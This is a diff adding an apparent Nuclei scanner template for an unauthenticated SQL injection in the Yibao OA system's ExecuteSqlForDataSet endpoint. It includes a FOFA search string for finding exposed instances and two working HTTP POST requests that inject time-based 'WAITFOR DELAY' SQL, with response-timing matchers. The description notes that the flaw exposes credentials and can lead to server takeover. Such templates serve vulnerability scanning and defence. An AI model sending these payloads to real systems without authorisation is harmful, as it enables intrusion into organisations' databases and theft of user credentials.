@@ -1,0 +1,44 @@
+id: yibaoOA-ExecuteSqlForDataSet-sql
+
+info:
+  name: 易宝OA ExecuteSqlForDataSet SQL注入漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: product="顶讯科技-易宝OA系统"
+    易宝OA ExecuteSqlForDataSet接口处存在SQL注入漏洞，未经身份认证的攻击者可以通过此漏洞获取数据库敏感信息，用户名密码等凭据，进一步利用可获取服务器权限。
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488469&idx=1&sn=c50020da66fcb8a90d6db78825ca8b24&chksm=c267a6e6f5102ff02d559325fabc37af87c77f10d437f342333cab35122736a56ff80a5bbda9&token=2115358587&lang=zh_CN#rd
+  tags: sql injection
+
+
+
+http:
+  - raw:
+      - |
+        POST /api/system/ExecuteSqlForDataSet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        token=zxh&sql=;WAITFOR DELAY '0:0:4'--&strParameters
+
+      - |
+        POST /api/system/ExecuteSqlForDataSet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        token=zxh&sql=;WAITFOR DELAY '0:0:8'--&strParameters
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and  
+
+
+
+
+
+
